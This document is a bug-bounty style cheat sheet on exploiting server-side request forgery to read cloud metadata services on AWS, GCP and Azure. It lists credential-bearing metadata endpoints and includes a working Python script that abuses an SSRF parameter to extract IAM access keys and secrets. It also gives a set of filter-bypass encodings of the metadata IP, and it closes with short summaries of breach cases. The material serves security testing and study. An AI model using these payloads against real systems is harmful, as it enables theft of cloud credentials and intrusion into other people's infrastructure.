# Cloud Metadata Exploitation via SSRF

**Criticidade**: 🔴 Crítica (CVSS 9.0-10.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $5,000 - $40,000 USD

---

## 📚 Cloud Metadata Services

### AWS IMDSv1 (169.254.169.254)

```bash
# Retrieve IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get instance metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Critical endpoints
/latest/meta-data/iam/security-credentials/[ROLE_NAME]
```

**Credentials format:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T12:00:00Z"
}
```

### AWS IMDSv2 (Token-based)

**Requires two requests:**

```bash
# 1. Get session token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. Use token for metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### GCP Metadata

```bash
# Requires Metadata-Flavor header
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Headers required
Metadata-Flavor: Google
```

**Token response:**
```json
{
  "access_token": "ya29...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

### Azure Metadata

```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Headers required
Metadata: true
```

---

## 💣 Exploitation Payloads

### SSRF to AWS Credentials

```python
import requests

# SSRF endpoint
url = "http://vulnerable-app.com/fetch?url="

# Exfiltrate IAM role
role_name = requests.get(
    url + "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
).text

# Get credentials
creds = requests.get(
    url + f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
).json()

print(f"AccessKeyId: {creds['AccessKeyId']}")
print(f"SecretAccessKey: {creds['SecretAccessKey']}")
```

### Bypass WAF/Filters

```bash
# URL encoding
http://169.254.169.254 → http%3A%2F%2F169.254.169.254

# Decimal IP
http://2852039166/  # 169.254.169.254 in decimal

# Octal IP
http://0251.0376.0251.0376/

# Hex IP
http://0xa9.0xfe.0xa9.0xfe/

# DNS rebinding
http://169.254.169.254.nip.io/
http://metadata.instance.internal/  # AWS internal DNS

# IPv6
http://[::ffff:a9fe:a9fe]/  # IPv4-mapped IPv6
```

---

## 🔥 Real Cases

**Capital One Breach (2019):**
- SSRF → AWS metadata
- Compromised credentials
- 100M+ records stolen
- $80M fine

**Shopify SSRF (2020):**
- $25,000 bounty
- GCP metadata access
- Service account tokens

---

**Última atualização**: 2024
